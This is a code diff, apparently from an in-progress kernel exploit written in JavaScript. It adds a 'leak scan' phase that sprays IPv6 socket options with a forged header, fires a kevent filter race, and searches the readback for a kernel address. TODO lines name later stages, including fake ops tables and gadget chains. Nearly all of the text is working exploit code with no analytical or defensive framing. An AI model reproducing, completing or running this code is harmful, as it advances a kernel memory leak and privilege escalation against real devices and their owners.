@@ -114,17 +114,67 @@ function fireKevent(kq, cl, ident) {
   put16(cl, 0x08, -23);
   put16(cl, 0x0A, EV_ADD);
   const rc = scn("kevent", kq, cl.addr, 1, 0, 0, 0);
-  const er = (typeof ctx().errno === "function") ? ctx().errno() : -1;
-  log("KEVENT-23", "kq=" + kq + " rc=" + rc + " errno=" + er + " ident=" + h16(ident));
-  if (rc !== 0) fin("kevent rc=" + rc + " errno=" + er);
+  log("KEVENT-23", "kq=" + kq + " rc=" + rc + " ident=" + h16(ident));
+  if (rc !== 0) fin("kevent rc=" + rc + " errno=" + ctx().errno());
   return rc;
 }
 
 function TODO(where) { fin("TODO: " + where + " (next port pass)"); }
+// ---------- phase 2: leak scan (ported: probe() 6-attempt loop) ----------
+const MARK_LO = 1128481603;   // walked-header magic at readback +8
+const MARK_HI = 1414812756;   // walked-header magic at readback +12
 
+function zeroBuf(buf) {
+  new Uint8Array(buf.ab).fill(0);
+}
+
+function readU64(buf, off) {
+  return (BigInt(buf.dv.getUint32(off + 4, true) >>> 0) << 32n) |
+         BigInt(buf.dv.getUint32(off, true) >>> 0);
+}
+
+function phase2Leak(rootKq, victims, fire23) {
+  const rdb = allocBuf(512);   // marked() readback buffer
+  const lenp = allocBuf(8);    // getsockopt length pointer
+  const tpl = allocBuf(512);   // re-arm template (forged header)
+  // template: same shape as the part-1 arm (size/segleft bytes; walk fills the rest)
+  tpl.dv.setUint8(1, 30);
+  tpl.dv.setUint8(3, 15);
+  put64(tpl, 0x10, rdb.addr);  // plausible segment slot (values refined by KV-RDB dump)
+
+  let kva = 0n;
+  for (let attempt = 1; attempt <= 6 && !kva; attempt++) {
+    log("KV-ATTEMPT", attempt + "/6");
+    for (const fd of victims) scn("setsockopt", fd, 41, 51, 0, 0);
+    for (const fd of victims) scn("setsockopt", fd, 41, 51, tpl.addr, 248);
+    fire23(rootKq);            // kevent filter -23 trigger (proven rc=0)
+    for (let ci = 0; ci < victims.length && !kva; ci++) {
+      const fd = victims[ci];
+      zeroBuf(rdb);
+      lenp.dv.setUint32(0, 248, true);
+      lenp.dv.setUint32(4, 0, true);
+      const rc = scn("getsockopt", fd, 41, 51, rdb.addr, lenp.addr, 0);
+      if (rc !== 0) continue;
+      if (lenp.dv.getUint32(0, true) !== 248) continue;
+      if ((rdb.dv.getUint32(8, true) >>> 0) !== MARK_LO) continue;
+      if ((rdb.dv.getUint32(12, true) >>> 0) !== MARK_HI) continue;
+      log("KV-MARKED", "attempt=" + attempt + " victim=" + ci + " fd=" + fd);
+      let hex = "";
+      for (let i = 0; i < 64; i++) hex += (rdb.u8 ? 0 : 0, new Uint8Array(rdb.ab)[i].toString(16).padStart(2, "0"));
+      log("KV-RDB", hex);
+      for (let off = 0x10; off < 0x40; off += 8) {
+        const v = readU64(rdb, off);
+        if ((v >> 32n) === 0xffffffffn && (v & 0xffffn) !== 0n) { kva = v; break; }
+      }
+      if (kva) log("KV-KVA", h16(kva));
+      else log("KV-NOKVA", "no kernel ptr in readback; see KV-RDB");
+    }
+  }
+  if (!kva) fin("leak scan: no marked victim in 6 attempts (race miss -- run again)");
+  return kva;
+}
 export async function runKevent(c) {
   STATE.ctx = c;
-  if (typeof c.errno !== "function") c.errno = function () { return -1; };
   const kob = c.params && c.params.get ? c.params.get("kbase") : null;
   if (kob) {
     STATE.kbase = BigInt(kob);
@@ -170,8 +220,9 @@ export async function runKevent(c) {
   if (leakKq < 0) fin("leak kqueue");
   fireKevent(leakKq, cl, (BigInt(GIDENT_HI) << 32n) | BigInt(GIDENT_LO));
 
-  TODO("node-walk builder + victim kva scan (region pc 7000-7700)");
-
+    const kva = phase2Leak(leakKq, victims, (kq) => fireKevent(kq, cl, (BigInt(GIDENT_HI) << 32n) | BigInt(GIDENT_LO)));
+  STATE.kva = kva;
+  TODO("fakeops build + -18 plant (region pc 6781-7709)");
   log("SLOT", "R_SLOT=" + h16(ka(P[13])) + " R_OPS=" + h16(ka(P[14])));
   TODO("E-gadget chains + readback (region pc 7950-8368)");
 
